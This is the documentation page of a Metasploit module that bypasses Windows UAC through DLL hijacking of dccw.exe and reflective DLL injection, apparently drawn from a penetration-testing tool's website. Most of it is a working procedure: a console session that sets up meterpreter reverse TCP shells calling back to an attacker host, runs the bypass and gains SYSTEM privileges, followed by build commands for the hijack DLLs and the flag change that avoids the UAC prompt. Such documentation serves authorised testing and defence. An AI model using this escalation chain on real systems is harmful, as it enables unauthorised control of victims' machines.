{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/bypassuac_injection_winsxs","result":{"data":{"moduleMetadataJson":{"id":"a71e74fe-a2d3-5757-a393-a6bfaec4a2fc","name":"Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS","fullname":"exploit/windows/local/bypassuac_injection_winsxs","description":"This module will bypass Windows UAC by utilizing the trusted publisher\n        certificate through process injection. It will spawn a second shell that\n        has the UAC flag turned off by abusing the way \"WinSxS\" works in Windows\n        systems. This module uses the Reflective DLL Injection technique to drop\n        only the DLL payload binary instead of three seperate binaries in the\n        standard technique. However, it requires the correct architecture to be\n        selected, (use x64 for SYSWOW64 systems also).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/bypassuac_injection_winsxs","documentationSlug":"/modules/documentation/exploit/windows/local/bypassuac_injection_winsxs"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module adds a bypass for UAC that relies on DLL hijacking of the dccw.exe process.  It has been tested on and\nsupports both x86 and x64 releases of Windows 8, 8.1, 10<em>1511, 10</em>1607, and 10_1703.  It does not work with any versions of Windows 7.</p>\n<p>Not Applicable; works on stock Windows releases.</p>\n<h3 id=\"running-example\" style=\"position:relative;\"><a href=\"#running-example\" aria-label=\"running example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Running Example:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt; use exploit/multi/handler\n&gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\n&gt; set LHOST &lt;MSF_IP&gt;\nLHOST =&gt; &lt;MSF_IP&gt;\n&gt;  set LPORT 30009\nLPORT =&gt; 30009\n&gt;  show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     &lt;MSF_IP&gt;         yes       The listen address\n   LPORT     30009            yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\n&gt; run -z\n[*] Started reverse TCP handler on &lt;MSF_IP&gt;:30009 \n[*] Starting the payload handler...\n[*] Sending stage (957487 bytes) to &lt;Win10x86_IP&gt;\n[*] Meterpreter session 1 opened (&lt;MSF_IP&gt;:30009 -&gt; &lt;Win10x86_IP&gt;:50041) at 2017-10-03 12:17:42 -0700\n[*] Session 1 created in the background.\n&gt; sessions -C sysinfo\n[*] Running &#39;sysinfo&#39; on meterpreter session 1 (&lt;Win10x86_IP&gt;)\nComputer        : WIN10X86-1511\nOS              : Windows 10 (Build 10586).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 4\nMeterpreter     : x86/windows\n&gt; sessions -C ifconfig\n[*] Running &#39;ifconfig&#39; on meterpreter session 1 (&lt;Win10x86_IP&gt;)\n\nInterface  1\n============\nName         : Software Loopback Interface 1\nHardware MAC : 00:00:00:00:00:00\nMTU          : 4294967295\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nIPv6 Address : ::1\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\n\n\nInterface  2\n============\nName         : Teredo Tunneling Pseudo-Interface\nHardware MAC : 00:00:00:00:00:00\nMTU          : 1280\nIPv6 Address : 2001:0:4137:9e76:38b8:1e49:3f57:795f\nIPv6 Netmask : ffff:ffff:ffff:ffff::\nIPv6 Address : fe80::38b8:1e49:3f57:795f\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\n\nInterface  3\n============\nName         : Intel(R) 82574L Gigabit Network Connection\nHardware MAC : 00:0c:29:73:25:67\nMTU          : 1500\nIPv4 Address : &lt;Win10x86_IP&gt;\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : fe80::cc97:6548:c10a:f034\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\n\nInterface  6\n============\nName         : Microsoft ISATAP Adapter #2\nHardware MAC : 00:00:00:00:00:00\nMTU          : 1280\nIPv6 Address : fe80::5efe:c0a8:86a0\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\n\n&gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type                     Information                            Connection\n  --  ----                     -----------                            ----------\n  1   meterpreter x86/windows  WIN10X86-1511\\msfuser @ WIN10X86-1511  &lt;MSF_IP&gt;:30009 -&gt; &lt;Win10x86_IP&gt;:50041 (&lt;Win10x86_IP&gt;)\n\n&gt; use exploit/windows/local/bypassuac_injection_winsxs\n&gt; set session 1\nsession =&gt; 1\n&gt; set target 0\ntarget =&gt; 0\n&gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\n&gt; set lhost &lt;MSF_IP&gt;\nlhost =&gt; &lt;MSF_IP&gt;\n&gt; set lport 30010\nlport =&gt; 30010\n&gt; set verbose true\nverbose =&gt; true\n&gt; show options\n\nModule options (exploit/windows/local/bypassuac_injection_winsxs):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     &lt;MSF_IP&gt;         yes       The listen address\n   LPORT     30010            yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows x86\n\n\n&gt; run -j\n[*] Exploit running as background job.\n[*] resource (/home/msfuser/rapid7/test_artifacts/test_rc/windows-meterpreter-reverse_tcp-192x168x134x160-30009.rc)&gt; Ruby Code (13 bytes)\n[*] Started reverse TCP handler on &lt;MSF_IP&gt;:30010 \n[*] resource (/home/msfuser/rapid7/test_artifacts/test_rc/windows-meterpreter-reverse_tcp-192x168x134x160-30009.rc)&gt; Ruby Code (12 bytes)\n[+] Windows 10 (Build 10586). may be vulnerable.\n[*] UAC is Enabled, checking level...\n[*] Checking admin status...\n[+] Part of Administrators group! Continuing...\n[+] UAC is set to Default\n[+] BypassUAC can bypass this setting, continuing...\n[*] Creating temporary folders...\n[*] Uploading the Payload DLL to the filesystem...\n[*] Payload DLL 18944 bytes long being uploaded...\n[*] Spawning process with Windows Publisher Certificate, to inject into...\n[*] Injecting  into process ID 3476\n[*] Opening process 3476\n[*] Injecting struct into 3476\n[*] Executing payload\n[+] Successfully injected payload in to process: 3476\n[*] Sending stage (957487 bytes) to &lt;Win10x86_IP&gt;\n[*] Meterpreter session 2 opened (&lt;MSF_IP&gt;:30010 -&gt; &lt;Win10x86_IP&gt;:50078) at 2017-10-03 12:19:03 -0700\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the path specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the file specified.\n[-] Error =&gt; Rex::Post::Meterpreter::RequestError - stdapi_fs_stat: Operation failed: The system cannot find the file specified.\n[+] All the dropped elements have been successfully removed\n&gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type                     Information                            Connection\n  --  ----                     -----------                            ----------\n  1   meterpreter x86/windows  WIN10X86-1511\\msfuser @ WIN10X86-1511  &lt;MSF_IP&gt;:30009 -&gt; &lt;Win10x86_IP&gt;:50041 (&lt;Win10x86_IP&gt;)\n  2   meterpreter x86/windows  WIN10X86-1511\\msfuser @ WIN10X86-1511  &lt;MSF_IP&gt;:30010 -&gt; &lt;Win10x86_IP&gt;:50078 (&lt;Win10x86_IP&gt;)\n\n&gt; sessions -C getuid\n[*] Running &#39;getuid&#39; on meterpreter session 1 (&lt;Win10x86_IP&gt;)\nServer username: WIN10X86-1511\\msfuser\n[*] Running &#39;getuid&#39; on meterpreter session 2 (&lt;Win10x86_IP&gt;)\nServer username: WIN10X86-1511\\msfuser\n&gt; sessions -C getsystem\n[*] Running &#39;getsystem&#39; on meterpreter session 1 (&lt;Win10x86_IP&gt;)\n[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)\n[*] Running &#39;getsystem&#39; on meterpreter session 2 (&lt;Win10x86_IP&gt;)\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n&gt; sessions -C getuid\n[*] Running &#39;getuid&#39; on meterpreter session 1 (&lt;Win10x86_IP&gt;)\nServer username: WIN10X86-1511\\msfuser\n[*] Running &#39;getuid&#39; on meterpreter session 2 (&lt;Win10x86_IP&gt;)\nServer username: NT AUTHORITY\\SYSTEM\n&gt; exit -y</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"compiling-instructions\" style=\"position:relative;\"><a href=\"#compiling-instructions\" aria-label=\"compiling instructions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Compiling Instructions</h2>\n<h3 id=\"compiling-template-dlls\" style=\"position:relative;\"><a href=\"#compiling-template-dlls\" aria-label=\"compiling template dlls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Compiling Template DLLs</h3>\n<p>To build the x86 template dll, use data/templates/src/pe/dll_gdiplus/build.sh\n(Requires mingw-w64 package from apt)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">cd data/templates/src/pe/dll_gdiplus\n./build.sh\ncp data/templates/src/pe/dll_gdiplus/template_x86_windows.dll data/templates/template_x86_windows_dccw_gdiplus.dll</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>To build the x64 binary\n(In an x64 VS2013 command prompt)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Z:\\metasploit-framework\\data\\templates\\src\\pe\\dll_gdiplus&gt;cl.exe -LD template.c /Zl /GS- /DBUILDMODE=2 /link /entry:DllMain &quot;kernel32.lib&quot;\ncp data/templates/src/pe/dll_gdiplus/template.dll data/templates/template_x64_windows_dccw_gdiplus.dll</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h3 id=\"compiling-bypassuac-x86dll-and-bypassuac-x64dll\" style=\"position:relative;\"><a href=\"#compiling-bypassuac-x86dll-and-bypassuac-x64dll\" aria-label=\"compiling bypassuac x86dll and bypassuac x64dll permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Compiling bypassuac-x86.dll and bypassuac-x64.dll</h3>\n<p>Open the Visual studio solution located in\nmetasploit-framework/external/source/exploits/bypassuac_injection/\nChoose <code class=\"language-text\">release</code> from the Solution configurations, build the x86 and x64 solutions.  The binaries should already\nbe in the right place.</p>\n<h1 id=\"more-information\" style=\"position:relative;\"><a href=\"#more-information\" aria-label=\"more information permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>More information</h1>\n<p>(From PR)</p>\n<p>I decided to create a different module and not to update the one called \"bypassuac<em>injection\", because in order to\nperform a DLL hijacking, I need to create several folders in which insert our malicious DLL. Also, I deleted these\nfiles and folders in a different way, instead using the method \"register</em>file<em>for</em>cleanup()\", so as to be able to\nremove the created folders and also prevent a very large output.</p>\n<p>If you want to understand the module in a deeper way I recommend you to visit the C++ project on my github:\n<a href=\"https://github.com/L3cr0f/DccwBypassUAC\">https://github.com/L3cr0f/DccwBypassUAC</a></p>\n<h2 id=\"dll-injection\" style=\"position:relative;\"><a href=\"#dll-injection\" aria-label=\"dll injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>DLL INJECTION</strong></h2>\n<p><strong>/metasploit-framework/external/source/exploits/bypassuac_injection/dll/src/Exploit.cpp\n/metasploit-framework/data/post/bypassuac-x64.dll\n/metasploit-framework/data/post/bypassuac-x86.dll</strong></p>\n<p>To perform the DLL hijacking we need to copy the file of our interest to a specific location (in our case \"C:\\Windows\\System32\") using IFileOperation. To do so, first we need to inject a DLL that will perform this task. This DLL is almost the same as the one used in the \"bypassuac_injection\" module, but, in latest Windows 10 systems (build equal or greater than 15003), the IFileOperation must be invoked in a different way so as to not trigger the UAC prompt. This modification will be:</p>\n<p><code class=\"language-text\">if (pFileOp-&gt;SetOperationFlags(FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION) != S_OK)</code></p>\n<p>to</p>\n<p><code class=\"language-text\">if (pFileOp-&gt;SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION) != S_OK)</code></p>\n<p>Note that this modification does not affect other modules.\nTo conclude this section, I didn't found the code of \"/metasploit-framework/data/post/bypassuac-[ARCH].exe\" to update it.</p>\n<h2 id=\"dll-hijacking\" style=\"position:relative;\"><a href=\"#dll-hijacking\" aria-label=\"dll hijacking permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>DLL HIJACKING</strong></h2>\n<p><strong>/metasploit-framework/data/templates/template<em>x86</em>windows<em>dccw</em>gdiplus.dll\n/metasploit-framework/data/templates/template<em>x64</em>windows<em>dccw</em>gdiplus.dll\n/metasploit-framework/data/templates/src/pe/dll<em>gdiplus/template.c\n/metasploit-framework/data/templates/src/pe/dll</em>gdiplus/template.h\n/metasploit-framework/data/templates/src/pe/dll<em>gdiplus/template.def\n/metasploit-framework/data/templates/src/pe/dll</em>gdiplus/template.rc\n/metasploit-framework/data/templates/src/pe/dll_gdiplus/build.sh\n/metasploit-framework/lib/msf/core/exploit/exe.rb\n/metasploit-framework/lib/msf/util/exe.rb</strong></p>\n<p>To execute code at high integrity we need to perform a DLL hijacking, but we cannot use the DLL templates provided by\nMetasploit since we need to forward some functions to the legit DLL, so we need to create a new couple of DLL templates,\nwhich are exactly the same but including the forwarding feature (the way I have implemented does not work on Windows 7).\nNow, despite working in a successfully way, I think it would be great including this forwarding feature on the fly, I mean,\nwithout having to create an additional DLL template. I don't know how this can be done, so if you come up with something,\nlet me know.</p>\n<p>Also, to load the previous DLL template we have modified the mentioned \"exe.rb\" files.</p>\n<h2 id=\"setup-the-vulnerable-environment\" style=\"position:relative;\"><a href=\"#setup-the-vulnerable-environment\" aria-label=\"setup the vulnerable environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>Setup the vulnerable environment</strong></h2>\n<p>The vulnerable environment setup is the same as the module \"bypassuac_injection\", we need a meterpreter session, select\nthe architecture (0 for x86 and 1 for x64), select the meterpreter payload based on the architecture we want to execute\nwith high integrity and set the regular parameters of the payload (LHOST, LPORT, etc).</p>"}}},"pageContext":{"id":"a71e74fe-a2d3-5757-a393-a6bfaec4a2fc"}}}